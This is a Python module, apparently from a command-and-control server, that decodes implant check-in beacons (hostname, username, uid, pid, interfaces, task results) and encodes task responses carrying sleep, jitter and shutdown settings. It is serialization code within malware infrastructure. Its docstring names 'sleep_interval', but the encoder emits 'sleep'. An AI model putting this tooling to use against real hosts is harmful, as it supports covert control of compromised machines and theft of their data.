"""Beacon encode/decode matching Go config.Beacon / config.BeaconResponse JSON tags."""

from __future__ import annotations

import json
from dataclasses import dataclass, field


@dataclass
class Beacon:
    """Check-in payload sent by the implant.

    Field names use snake_case matching Go json tags:
        implant_id, hostname, username, uid, pid, os, arch,
        in_namespace, interfaces, results
    """

    implant_id: str
    hostname: str
    username: str
    uid: int
    pid: int
    os: str
    arch: str
    in_namespace: bool
    interfaces: list = field(default_factory=list)
    results: list = field(default_factory=list)  # list of TaskResult dicts


@dataclass
class BeaconResponse:
    """Response from the C2 server to an implant beacon.

    Field names use snake_case matching Go json tags:
        tasks, sleep_interval, jitter, shutdown
    """

    tasks: list = field(default_factory=list)  # list of Task dicts {id, type, args}
    sleep_interval: int = 30
    jitter: float = 0.2
    shutdown: bool = False


def decode_beacon(plaintext: bytes) -> Beacon:
    """Deserialize a decrypted beacon payload from the implant.

    Args:
        plaintext: Decrypted JSON beacon bytes.

    Returns:
        Populated Beacon dataclass.

    Raises:
        ValueError: If JSON parsing fails.
    """
    try:
        obj: dict = json.loads(plaintext)
    except json.JSONDecodeError as exc:
        raise ValueError(f"beacon JSON decode failed: {exc}") from exc

    implant_id = obj.get("implant_id", "")
    if not implant_id:
        raise ValueError("beacon missing required field: implant_id")

    try:
        uid = int(obj.get("uid", 0))
        pid = int(obj.get("pid", 0))
    except (TypeError, ValueError) as exc:
        raise ValueError(f"beacon field type error: {exc}") from exc

    interfaces = obj.get("interfaces") or []
    if not isinstance(interfaces, list):
        raise ValueError("beacon field 'interfaces' must be a list")

    results = obj.get("results") or []
    if not isinstance(results, list):
        raise ValueError("beacon field 'results' must be a list")

    return Beacon(
        implant_id=implant_id,
        hostname=obj.get("hostname", ""),
        username=obj.get("username", ""),
        uid=uid,
        pid=pid,
        os=obj.get("os", ""),
        arch=obj.get("arch", ""),
        in_namespace=bool(obj.get("in_namespace", False)),
        interfaces=interfaces,
        results=results,
    )


def encode_response(response: BeaconResponse) -> bytes:
    """Serialize a BeaconResponse to JSON bytes for encryption by the caller.

    Args:
        response: BeaconResponse to encode.

    Returns:
        JSON bytes ready for AES-GCM encryption.
    """
    obj: dict = {
        "tasks": response.tasks,
        "sleep": response.sleep_interval,
        "jitter": response.jitter,
        "shutdown": response.shutdown,
    }
    return json.dumps(obj, separators=(",", ":")).encode()
